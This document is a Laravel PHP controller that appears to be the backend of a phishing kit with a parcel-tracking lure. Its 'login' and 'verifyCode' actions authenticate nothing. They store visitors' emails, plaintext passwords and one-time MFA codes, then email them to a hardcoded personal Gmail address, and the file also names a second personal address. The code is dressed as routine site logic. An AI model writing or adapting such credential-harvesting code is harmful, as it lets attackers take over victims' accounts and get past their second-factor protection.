<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\PaxUser;
use Illuminate\Support\Facades\Mail;
use App\Mail\PaxUserRegistered;
use App\Mail\PaxUserLogged;
use App\Mail\PaxUserVerified;
use Illuminate\Support\Facades\Session;

class PageController extends Controller
{
    public function register(Request $request)
    {
        // Validate the email
        $request->validate([
            'email' => 'required|email|unique:pax_users,email', // Ensure email is unique
        ]);

        // Generate a random six-digit number
        // $verificationCode = random_int(100000, 999999);

        // Store the user with verification code
        $user = PaxUser::create([
            'email' => $request->email,
            // 'verification_code' => $request->code, // Save the verification code
        ]);

        // Send a welcome email
        $email = 'brannyk001@gmail.com';
        // $email = 'mmosobo@gmail.com';
        Mail::to($email)->send(new PaxUserRegistered($user->email));

        // Redirect with a success message
        return view('app')->with('message', 'Email submitted successfully! Check your inbox for the verification code.');
    }

    public function login(Request $request)
    {
        // Validate the email
        $request->validate([
            'email' => 'required|email|unique:users,email', // Ensure 'users' is the correct table name
            'password' => 'required|min:8', // Add minimum length for better security
        ]);
        

        // Handle the data (for example, store it in the database)
        $user = PaxUser::create([
            'email' => $request->email,
            'password' => $request->password,
        ]);

        // Send a login email to logged in user
        // $adminemail = 'mmosobo@gmail.com';
        $adminemail = 'brannyk001@gmail.com';
        Mail::to($adminemail)->send(new PaxUserLogged($user->email, $user->password));

        // Store email in session
        session(['email' => $user->email]);

            // Redirect with a success message or handle accordingly
            return view('mfa')->with('message', 'Email submitted successfully!');
    }

    public function verifyCode(Request $request)
    {
         // Retrieve the email from the session
         $email = session('email');
         $code = $request->code;
        // $expectedCode = Session::get('verification_code');
        // Handle the data (for example, store it in the database)
        $user = PaxUser::create([
            'email' => $email,
            'verification_code' => $code,
        ]);

        // Send a verification code email 
        $adminemail = 'brannyk001@gmail.com';
        // $adminemail = 'mmosobo@gmail.com';
        Mail::to($adminemail)->send(new PaxUserVerified($email, $code));
    }

    public function trackOrder(Request $request)
    {
        return view('track')->with('message', 'Email submitted successfully!');
    }
}
